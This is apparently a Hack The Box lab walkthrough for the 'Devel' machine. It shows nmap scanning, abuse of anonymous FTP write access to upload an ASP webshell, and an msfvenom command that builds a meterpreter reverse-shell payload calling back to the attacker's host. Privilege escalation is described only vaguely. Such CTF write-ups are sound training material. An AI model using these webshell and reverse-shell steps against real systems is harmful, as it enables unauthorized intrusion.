## Walkthrough

### Enumeration

```terminal
root@parrot  ~/Desktop/hackthebox/devel  nmap -sC -sV 10.10.10.5
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 12:43 IST
Nmap scan report for 10.10.10.5

```

We can see Anonymous FTP login

```terminal
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
 ```

Checking web servers

 ![port80](/assets/img/devel/port80.png)

On looking into directory, it turns out be same as ftp.

So we have write privs in ftp and the machine is running windows iis so we can upload .asp reverse shell.

### Exploitation

```terminal
root@parrot  ~/Desktop/hackthebox/devel  cp /usr/share/webshells/asp/cmdasp.asp .
root@parrot  ~/Desktop/hackthebox/devel  ftp 10.10.10.5

```
Alright so we can really edit in ftp. I tested by uploading a webshell.

![aspx](/assets/img/devel/cmdasp.png)

Now it's time to get meterpreter shell.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f aspx> exploit.aspx      

uploaded this in ftp.

### PostExploitation

Now we have meterpreter let's see local_exploit_suggester.

I landed on many exploits tried a few and one worked for me.

Rooted :)
